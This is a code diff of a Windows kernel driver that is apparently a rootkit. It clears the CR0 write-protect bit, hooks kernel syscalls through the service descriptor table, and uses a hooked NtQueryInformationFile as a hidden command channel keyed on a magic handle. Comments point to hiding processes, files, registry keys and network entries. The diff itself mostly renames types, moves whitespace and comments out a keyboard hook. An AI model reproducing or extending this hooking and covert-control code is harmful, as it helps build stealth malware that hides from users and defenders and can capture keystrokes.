@@ -14,7 +14,7 @@ typedef struct _KSERVICE_TABLE_DESCRIPTOR {
 } KSERVICE_TABLE_DESCRIPTOR, * PKSERVICE_TABLE_DESCRIPTOR;
 
 
-typedef NTSTATUS (*NtQueryInformationFile)(
+typedef NTSTATUS (*NT_QUERY_INFORMATION_FILE)(
     HANDLE                 FileHandle,
     PIO_STATUS_BLOCK       IoStatusBlock,
     PVOID                  FileInformation,
@@ -43,8 +43,9 @@ ULONG SplicingSyscall(ULONG addressSyscall,
     ULONG skipCount);
 void UnhookSyscall(PUCHAR addressSyscall, PUCHAR saveBytes);
 
-NtQueryInformationFile glRealNtQueryInformationFile;
+NT_QUERY_INFORMATION_FILE glRealNtQueryInformationFile;
 extern PKSERVICE_TABLE_DESCRIPTOR KeServiceDescriptorTable;
+
 
 ULONG ClearWP(void) {
 
@@ -60,7 +61,6 @@ ULONG ClearWP(void) {
     return reg;
 }
 
-
 void WriteCR0(ULONG reg) {
 
     __asm {
@@ -69,6 +69,7 @@ void WriteCR0(ULONG reg) {
     }
 
 }
+
 
 NTSTATUS DriverEntry(IN PDRIVER_OBJECT dob, IN PUNICODE_STRING rgp) {
 
@@ -80,7 +81,7 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT dob, IN PUNICODE_STRING rgp) {
     DbgPrint("Registry path %wZ\n", rgp);
 #endif
 
-    glRealNtQueryInformationFile = (NtQueryInformationFile)KeServiceDescriptorTable->Base[NUMBER_NT_QUERY_INFORMATION_FILE];
+    glRealNtQueryInformationFile = (NT_QUERY_INFORMATION_FILE)KeServiceDescriptorTable->Base[NUMBER_NT_QUERY_INFORMATION_FILE];
     glRealNtQuerySystemInformation = (NT_QUERY_SYSTEM_INFORMATION)KeServiceDescriptorTable->Base[NUMBER_NT_QUERY_SYSTEM_INFORMATION];
     //glRealNtQueryDirectoryFile = (NT_QUERY_DIRECTORY_FILE)KeServiceDescriptorTable->Base[NUMBER_NT_QUERY_DIRECTORY_FILE];
     glRealNtEnumerateKey = (NT_ENUMERATE_KEY)KeServiceDescriptorTable->Base[NUMBER_NT_ENUMERATE_KEY];
@@ -91,7 +92,6 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT dob, IN PUNICODE_STRING rgp) {
     if (!NT_SUCCESS(status)) {
         return status;
     }
-
 
 
     reg = ClearWP();
@@ -130,11 +130,11 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT dob, IN PUNICODE_STRING rgp) {
     //
 
     //Hook keyboard
-    status = InitHookKeyboard(dob);
+    /*status = InitHookKeyboard(dob);
     if (!NT_SUCCESS(status)) {
         DbgPrint("Init hook keyboard error %X", status);
         return status;
-    }
+    }*/
     //
 
     dob->DriverUnload = DriverUnload;
@@ -184,7 +184,7 @@ VOID DriverUnload(IN PDRIVER_OBJECT dob) {
     //
 
     //unhook keyboard
-    UnhookKeyboard(dob);
+    //UnhookKeyboard(dob);
     //
 
     if (glRealIrpMjDeviceControl) {
@@ -198,6 +198,7 @@ VOID DriverUnload(IN PDRIVER_OBJECT dob) {
     return;
 }
 
+
 ULONG_PTR HookNtQueryInformationFile(
     HANDLE                 FileHandle,
     PIO_STATUS_BLOCK       IoStatusBlock,
@@ -205,11 +206,13 @@ ULONG_PTR HookNtQueryInformationFile(
     ULONG                  Length,
     FILE_INFORMATION_CLASS FileInformationClass)
 {
-    PCOMMAND pCmd;
+    
     NTSTATUS retStatus = STATUS_SUCCESS;
     
     if ((ULONG)FileHandle == (ULONG)SYSCALL_SIGNATURE) {
-        pCmd = (PCOMMAND)IoStatusBlock;
+
+        PCOMMAND pCmd = (PCOMMAND)IoStatusBlock;
+
         if (pCmd->flags & COMMAND_TEST_COMMAND) {
             DbgPrint("HookNtQueryInformationFile execute\n");
         }
@@ -265,10 +268,6 @@ ULONG_PTR HookNtQueryInformationFile(
         else {
             DbgPrint("No dispatch for command with flag %d\n", pCmd->flags);
         }
-        //PrintTaskQueueProcessList();
-        //PrintTaskQueueFileList();
-        //PrintTaskQueueKeyList();
-        //PrintTaskQueueNetList();
     }
     else {
         retStatus = glRealNtQueryInformationFile(
@@ -285,6 +284,10 @@ ULONG_PTR HookNtQueryInformationFile(
 
     return retStatus;
 }
+
+
+
+//--------------------
 
 ULONG SplicingSyscall(ULONG addressSyscall, void* addressHooker, PUCHAR saveBytes, BOOLEAN noCheck, ULONG skipCount) {
 
@@ -311,10 +314,6 @@ ULONG SplicingSyscall(ULONG addressSyscall, void* addressHooker, PUCHAR saveByte
     else
         return addressSyscall + 5;
 }
-
-
-//--------------------
-
 
 
 void UnhookSyscall(PUCHAR addressSyscall, PUCHAR saveBytes) {
